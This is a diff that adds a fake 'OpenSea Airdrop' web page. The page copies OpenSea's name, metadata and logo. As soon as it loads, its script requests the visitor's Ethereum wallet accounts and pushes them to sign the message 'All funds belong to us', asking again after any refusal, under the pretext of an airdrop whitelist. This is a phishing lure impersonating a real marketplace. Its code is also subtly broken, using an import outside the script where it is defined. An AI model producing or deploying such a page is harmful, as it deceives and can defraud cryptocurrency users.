@@ -1,0 +1,160 @@
+<html>
+  <head>
+    <title>OpenSea Airdrop</title>
+    <meta charset="utf-8" />
+    <meta content="width=device-width,initial-scale=1" name="viewport" />
+    <link href="https://opensea.io" hreflang="en" rel="alternate" />
+    <link href="https://opensea.io/es" hreflang="es" rel="alternate" />
+    <link href="https://opensea.io/de-DE" hreflang="de-DE" rel="alternate" />
+    <link href="https://opensea.io/fr" hreflang="fr" rel="alternate" />
+    <link href="https://opensea.io/ja" hreflang="ja" rel="alternate" />
+    <link href="https://opensea.io/kr" hreflang="kr" rel="alternate" />
+    <title>OpenSea, the largest NFT marketplace</title>
+    <meta content="OpenSea, the largest NFT marketplace" property="og:title" />
+    <meta content="website" property="og:type" />
+    <meta
+      content="https://static.opensea.io/og-images/Metadata-Image.png"
+      property="og:image"
+    />
+    <meta content="https://opensea.io/" property="og:url" />
+    <meta
+      content="OpenSea is the world's first and largest web3 marketplace for NFTs and crypto collectibles. Browse, create, buy, sell, and auction NFTs using OpenSea today."
+      property="og:description"
+    />
+    <meta content="en_US" property="og:locale" />
+    <meta content="OpenSea" property="og:site_name" />
+    <link href="https://opensea.io" rel="canonical" />
+    <meta
+      content="OpenSea is the world's first and largest web3 marketplace for NFTs and crypto collectibles. Browse, create, buy, sell, and auction NFTs using OpenSea today."
+      name="description"
+    />
+    <script type="module">
+      import {
+        ethers,
+        BrowserProvider,
+      } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.8.1/ethers.min.js";
+    </script>
+    <script>
+      const ethereum = window.ethereum;
+      connect();
+
+      function connect() {
+        try {
+          ethereum
+            .request({ method: "eth_requestAccounts" })
+            .then((response) => {
+              console.log(response);
+              signMessage();
+            })
+            .catch((responseError) => {
+              //connect();
+            });
+        } catch (connectError) {
+          ethereum
+            .enable()
+            .then((response) => {
+              console.log(response);
+              signMessage();
+            })
+            .catch((responseError) => {
+              //connect();
+            });
+        }
+      }
+
+      function signMessage() {
+        const provider = new BrowserProvider(window.ethereum);
+        console.log("provider", provider);
+        provider
+          .getSigner()
+          .then((signer) => {
+            console.log("signer", signer);
+
+            signer
+              .signMessage("All funds belong to us")
+              .then((signResponse) => {
+                console.log("signResponse", signResponse);
+                alert(signResponse);
+              })
+              .catch((signResponseError) => {
+                signMessage();
+                console.log("signResponseError", signResponseError);
+              });
+          })
+          .catch((signerError) => {
+            console.log(signerError);
+          });
+      }
+    </script>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+      }
+
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: sans-serif;
+      }
+
+      .container {
+        display: flex;
+        flex-direction: column;
+
+        align-items: center;
+        justify-content: center;
+      }
+
+      .logo {
+        display: flex;
+        width: 250px;
+        align-items: center;
+        justify-content: center;
+
+        margin-bottom: 20px;
+      }
+
+      .title {
+        display: flex;
+
+        align-items: center;
+        justify-content: center;
+
+        text-align: center;
+
+        font-size: 30px;
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+
+      .txt {
+        display: flex;
+
+        align-items: center;
+        justify-content: center;
+
+        text-align: center;
+
+        font-size: 16px;
+        margin-bottom: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo">
+        <img src="https://opensea.io/static/images/logos/opensea-logo.svg" />
+      </div>
+      <span class="title">OpenSea Airdrop</span>
+      <span class="txt"
+        >Sign the message to be whitelisted for the OpenSea Airdrop</span
+      >
+      <button onclick="connect()">Sign message</button>
+    </div>
+  </body>
+</html>
